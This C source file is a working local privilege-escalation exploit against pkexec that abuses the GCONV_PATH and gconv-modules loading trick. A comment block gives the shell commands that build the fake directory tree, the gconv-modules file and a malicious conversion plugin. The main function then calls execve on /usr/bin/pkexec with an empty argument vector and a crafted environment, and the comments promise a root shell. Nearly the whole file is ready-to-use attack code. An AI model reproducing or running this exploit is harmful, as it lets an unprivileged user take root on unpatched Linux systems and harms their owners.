#include <stdio.h>
#include <unistd.h>


/*

# To prepare the exploit:

#
# Create a special filesystem hieararchy. This is where g_find_program_in_path() from pkexec will check for the presense of the bogus_binary.
#
mkdir GCONV_PATH=.
mkdir GCONV_PATH=./tmp
# Just the hash bang stanza inside, no code.
echo '#!/bin/bash' > GCONV_PATH=./tmp/bogus_binary
chmod +x GCONV_PATH=./tmp/bogus_binary

#
# Create the directory where iconv_open() from glibc will look for the gconv-modules file, which contains our custom conversion mapping.
#

mkdir tmp
mkdir tmp/bogus_binary

# This line inside of gconv-modules essentially says: convert from UTF-8 to es_ES using the conversion_plugin.so
echo 'module  UTF-8// es_ES// conversion_plugin.so' > tmp/bogus_binary/gconv-modules


#
# Rrepare the conversion_plugin.
#

# Use the Makefile provided in this folder to compile this file and the conversion plugin in one go
make all
cp conversion_plugin.so tmp/bogus_binary/


#
# Run the execve binary and see your root shell spawned. Actually it will spawn 2 times because charset conversion happens twice for 2 error messages.
#
*/

int main(void)
{
    char *file = "/usr/bin/pkexec";

    // Initialize argv[0] to NULL.
    char *args_vector[] = {
        NULL,
    };


    char *environment_vector[] = {
      "bogus_binary",
      "PATH=GCONV_PATH=./tmp",
      "CHARSET=es_ES",
      "SHELL=/inexistent/shell",
        NULL
    };


    execve(file, args_vector, environment_vector);

    return 0;
}
